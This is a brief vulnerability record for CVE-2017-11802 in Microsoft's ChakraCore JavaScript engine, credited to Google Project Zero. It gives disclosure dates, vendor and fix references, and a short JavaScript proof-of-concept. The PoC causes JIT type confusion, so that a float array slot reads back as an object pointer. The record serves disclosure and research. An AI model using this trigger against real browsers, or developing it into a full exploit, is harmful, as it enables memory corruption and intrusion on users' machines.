# CVE-2017-11802

- Report: Aug 2017
- Fix: Oct 2017
- Credit: lokihardt of Google Project Zero

## PoC

```javascript
function main() {
    let arr = [1.1, 1.1, 1.1, 1.1, 1.1];
    function opt(f) {
        arr[0] = 1.1;
        arr[1] = 2.3023e-320 + parseInt('a'.replace('a', f));
        arr[2] = 1.1;
        arr[3] = 1.1;
    }

    let r0 = () => '0';
    for (var i = 0; i < 0x1000; i++)
        opt(r0);

    opt(() => {
        arr[0] = {};
        return '0';
    });

    print(arr[1]);
}

main();
```

## Reference

- [Microsoft](https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2017-11802)
- [Google Project Zero](https://bugs.chromium.org/p/project-zero/issues/detail?id=1334)
- [Fix](https://github.com/Microsoft/ChakraCore/commit/b7dcda019940222b0a9288fabb204b849c4cad40)